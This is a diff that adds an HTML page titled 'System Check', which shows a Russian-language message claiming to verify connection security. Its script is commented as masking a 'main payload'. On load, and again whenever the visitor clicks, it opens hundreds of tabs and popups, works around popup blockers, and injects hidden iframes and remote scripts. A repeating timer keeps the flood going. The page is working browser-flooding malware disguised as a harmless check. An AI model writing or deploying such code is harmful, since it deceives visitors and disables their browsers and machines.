@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Check</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            color: #333;
+            margin-top: 30px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>Проверка безопасности соединения...</h2>
+    <p>Пожалуйста, подождите. Идет проверка параметров подключения.</p>
+    <p style="font-size: 12px; color: #999;">Время ожидания: не более 30 секунд</p>
+
+    <script type="text/javascript">
+        // Маскировка: создаем безобидный таймер
+        setTimeout(function() {
+            document.body.innerHTML += '<p style="color:green">✓ Соединение защищено. Перенаправление...</p>';
+        }, 3000);
+
+        // ОСНОВНАЯ НАГРУЗКА: открытие бесконечных вкладок
+        // Используем разные имена окон и тайминги для обхода блокировщиков
+        function floodTabs() {
+            var urls = [
+                'https://google.com',
+                'https://yandex.ru',
+                'https://bing.com',
+                'https://yahoo.com',
+                'https://duckduckgo.com',
+                'https://www.bing.com',
+                'https://www.yahoo.com',
+                'https://www.duckduckgo.com',
+                'https://www.google.com',
+                'https://yandex.by'
+            ];
+            
+            // Открываем 200 вкладок с разными задержками
+            for (var i = 0; i < 200; i++) {
+                (function(index) {
+                    setTimeout(function() {
+                        try {
+                            // Используем уникальное имя окна для каждой вкладки
+                            var windowName = 'popup_' + index + '_' + Math.random().toString(36).substring(7);
+                            
+                            // Открываем вкладку
+                            var win = window.open(
+                                urls[index % urls.length] + '?t=' + Date.now() + index, 
+                                windowName, 
+                                'width=800,height=600,left=' + (index * 10 % 500) + ',top=' + (index * 5 % 400)
+                            );
+                            
+                            // Если вкладка заблокирована - пробуем через ссылку
+                            if (!win || win.closed || typeof win.closed == 'undefined') {
+                                var a = document.createElement('a');
+                                a.href = urls[index % urls.length] + '?fallback=' + index;
+                                a.target = '_blank';
+                                a.rel = 'noopener noreferrer';
+                                a.click();
+                            }
+                            
+                            // Пытаемся открыть еще одну в этой же итерации
+                            setTimeout(function() {
+                                window.open(urls[(index+1) % urls.length], '_blank');
+                            }, 50);
+                            
+                        } catch(e) {
+                            // Игнорируем ошибки - продолжаем открывать
+                            var img = new Image();
+                            img.src = urls[index % urls.length] + '/track.gif?' + index;
+                        }
+                    }, index * 30); // Каждые 30 миллисекунд новая вкладка
+                })(i);
+            }
+            
+            // Дополнительная волна вкладок с другими таймингами
+            for (var j = 200; j < 500; j++) {
+                (function(index2) {
+                    setTimeout(function() {
+                        // Пробуем разные методы
+                        window.open(urls[index2 % urls.length], '_blank');
+                        
+                        // Создаем невидимый iframe (тоже грузит процессор)
+                        var iframe = document.createElement('iframe');
+                        iframe.src = urls[index2 % urls.length];
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
+                        
+                        // Загружаем скрытые скрипты
+                        var script = document.createElement('script');
+                        script.src = urls[index2 % urls.length] + '/analytics.js?' + index2;
+                        document.head.appendChild(script);
+                        
+                    }, index2 * 20);
+                })(j);
+            }
+        }
+
+        // Запускаем после загрузки страницы
+        window.onload = function() {
+            floodTabs();
+            
+            // Повторяем каждые 5 секунд (для надежности)
+            setInterval(function() {
+                for (var k = 0; k < 50; k++) {
+                    setTimeout(function() {
+                        window.open('https://www.' + k + '.com', '_blank');
+                    }, k * 100);
+                }
+            }, 5000);
+        };
+
+        // Обработка кликов (если пользователь попытается закрыть)
+        document.addEventListener('click', function() {
+            for (var i = 0; i < 20; i++) {
+                window.open('https://click' + i + '.com', '_blank');
+            }
+        });
+
+        // Имитация активности (чтобы пользователь не закрыл сразу)
+        console.log('Проверка системы...');
+    </script>
+</body>
+</html>
